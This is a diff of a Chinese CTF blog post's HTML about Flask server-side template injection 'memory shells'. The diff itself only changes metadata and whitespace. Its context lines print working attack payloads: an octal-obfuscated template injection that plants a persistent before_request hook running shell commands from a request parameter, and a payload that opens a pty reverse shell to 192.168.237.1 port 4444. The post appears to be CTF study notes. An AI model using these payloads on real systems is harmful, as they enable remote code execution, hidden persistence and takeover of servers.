@@ -16,10 +16,10 @@
 <meta property="og:description" content="打ctf的时候遇到很多flask打ssti，遇到没有回显时，往往除了覆盖加盲注就不知道怎么弄了，今天来学习下其他师傅发现的内存马。记录一下当作笔记。 低版本内存马在flask中，没有定义的路由会返回404的，因此内存马最初是通过动态注册路由来实现的。 1&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&amp;#x27">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-02-24T11:05:16.000Z">
-<meta property="article:modified_time" content="2025-03-05T07:24:36.801Z">
+<meta property="article:modified_time" content="2025-05-09T16:28:36.720Z">
 <meta property="article:author" content="Oceanzbz">
-<meta property="article:tag" content="内存马">
 <meta property="article:tag" content="Python安全">
+<meta property="article:tag" content="内存马">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
     
@@ -249,6 +249,7 @@
 
 <p>无字母payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\137\137\143\154\141\163\163\137\137&#x27;</span>][<span class="string">&#x27;\137\137\142\141\163\145\137\137&#x27;</span>][<span class="string">&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;\137\137\151\156\151\164\137\137&#x27;</span>][<span class="string">&#x27;\137\137\147\154\157\142\141\154\163\137\137&#x27;</span>][<span class="string">&#x27;\137\137\142\165\151\154\164\151\156\163\137\137&#x27;</span>][<span class="string">&#x27;\145\170\145\143&#x27;</span>](<span class="string">&quot;\163\171\163.\155\157\144\165\154\145\163[&#x27;\137\137\155\141\151\156\137\137&#x27;].\137\137\144\151\143\164\137\137[&#x27;\141\160\160&#x27;].\142\145\146\157\162\145\137\162\145\161\165\145\163\164\137\146\165\156\143\163.\163\145\164\144\145\146\141\165\154\164(\116\157\156\145, []).\141\160\160\145\156\144(\154\141\155\142\144\141: \137\137\151\155\160\157\162\164\137\137(&#x27;\157\163&#x27;).\160\157\160\145\156(\137\137\151\155\160\157\162\164\137\137(&#x27;\146\154\141\163\153&#x27;).\162\145\161\165\145\163\164.\141\162\147\163.\147\145\164(&#x27;\141&#x27;)).\162\145\141\144())&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
 <h3 id="无字母弹shell"><a href="#无字母弹shell" class="headerlink" title="无字母弹shell"></a>无字母弹shell</h3><p>原payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;python3 -c \&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;192.168.237.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)\&#x27;&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
